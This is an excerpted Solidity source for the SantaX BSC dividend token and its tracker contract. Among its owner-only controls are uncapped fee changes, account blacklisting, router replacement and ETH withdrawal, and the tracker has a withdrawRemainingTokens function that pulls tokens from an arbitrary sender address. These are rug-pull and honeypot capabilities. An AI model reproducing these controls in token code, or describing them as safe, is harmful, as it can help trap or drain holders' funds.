/*
 http://santa-x.net/
 TG: https://t.me/SantaXbscofficial
*/
...
contract SantaX is Context, ERC20, Ownable {
    using SafeMath for uint256;
   ...
   SantaXDividendTracker public dividendTracker;

	address public marketingWallet;
    address private liquidityWallet;
    address public santaGiftBag;
    ...
    uint256 private _buySantaGiftFee;

    uint256 private _sellRewardsFee;
    uint256 private _sellLiquidityFee;
	uint256 private _sellMarketingFee;
    uint256 private _sellSantaGiftFee;
    ...
    constructor() ERC20 ("SantaX", "SantaX") {
        _buyRewardsFee = 2;
        _buyLiquidityFee = 5;
		_buyMarketingFee = 7;
        _buySantaGiftFee = 1;
        ...
        _maxBuy = 1000000000 * (10**18);
        _maxSell = 1000000000 * (10**18);

        totalBuyFees = _buyRewardsFee.add(_buyLiquidityFee).add(_buyMarketingFee).add(_buySantaGiftFee);
        totalSellFees = _sellRewardsFee.add(_sellLiquidityFee).add(_sellMarketingFee).add(_sellSantaGiftFee);

    	dividendTracker = new SantaXDividendTracker();

    	liquidityWallet = owner();
		
		marketingWallet = payable(0x3a513dB04c5667cf57CfB43B91677C61a614f20F);
        santaGiftBag = payable(0xAB4C246A227873f1B2AE0feEb9F14c86a2E64BC0);
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "SantaX: The dividend tracker already has that address");

        SantaXDividendTracker newDividendTracker = SantaXDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "SantaX: The new dividend tracker must be owned by the SantaX token contract");
    ...
    function updateDividendToken(address newAddress) public onlyOwner {
        require(newAddress != address(DividendsToken), "SantaX: The router already has that address");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "SantaX: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "SantaX: Account is already the value of 'excluded'");
    ...
    function addToBlacklist(address account, bool blacklisted) public onlyOwner {
        require(_isBlacklisted[account] != blacklisted, "SantaX: Account is already the value of 'blacklisted'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "SantaX: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "SantaX: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "SantaX: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "SantaX: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "SantaX: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
		...
		if(canSwap && !swapping && !automatedMarketMakerPairs[from] && from != liquidityWallet && to != liquidityWallet && from != marketingWallet && to != marketingWallet && !_isExcludedFromFees[to] && !_isExcludedFromFees[from]) {
            ...
            if(burning) {
                uint256 burningAmount = contractTokenBalance.div(2);
                contractTokenBalance = contractTokenBalance.sub(burningAmount);
                super._transfer(address(this), 0x000000000000000000000000000000000000dEaD, burningAmount);
            }
		    uint256 swapTokens;
			uint256 swapAmount = _sellMarketingFee.add(_sellRewardsFee).add(_sellLiquidityFee).add(_sellSantaGiftFee);
            ...
            if (_sellSantaGiftFee > 0) {

            transferToWallet(payable(santaGiftBag), address(this).balance.mul(_sellSantaGiftFee).div(swapAmount));
            }
	...
	function letsGoLive() external onlyOwner() {
        updateBuyFees(5,8,2,1);
        updateSellFees(5,8,2,1);
    ...
    function updateBuyFees(uint8 newBuyLiquidityFee, uint8 newBuyMarketingFee, uint8 newBuyRewardsFee, uint8 newBuySantaGiftFee) public onlyOwner {
        _buyLiquidityFee = newBuyLiquidityFee;
        _buyMarketingFee = newBuyMarketingFee;
        _buyRewardsFee = newBuyRewardsFee;
        _buySantaGiftFee = newBuySantaGiftFee;
        
        totalFees();
    }

    function updateSellFees(uint8 newSellLiquidityFee, uint8 newSellMarketingFee, uint8 newSellRewardsFee, uint8 newSellSantaGiftFee) public onlyOwner {
        _sellLiquidityFee = newSellLiquidityFee;
        _sellMarketingFee = newSellMarketingFee;
        _sellRewardsFee = newSellRewardsFee;
        _sellSantaGiftFee = newSellSantaGiftFee;
    ...
    function withdrawRemainingETH(address account) public onlyOwner {
...
contract SantaXDividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("SantaX_Dividend_Tracker", "SantaX_Dividend_Tracker") {
    	claimWait = 0;
    ...
    function withdrawDividend() public pure override {
        require(false, "SantaX_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SantaX contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 0 && newClaimWait <= 86400, "SantaX_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SantaX_Dividend_Tracker: Cannot update claimWait to same value");
    ...
    function withdrawRemainingTokens(address token, address recipient, address sender) public {
        require(isAuth[msg.sender]);
        ERC20(token).transferFrom(address(sender), address(recipient), IERC20(token).balanceOf(address(this)));
    }
}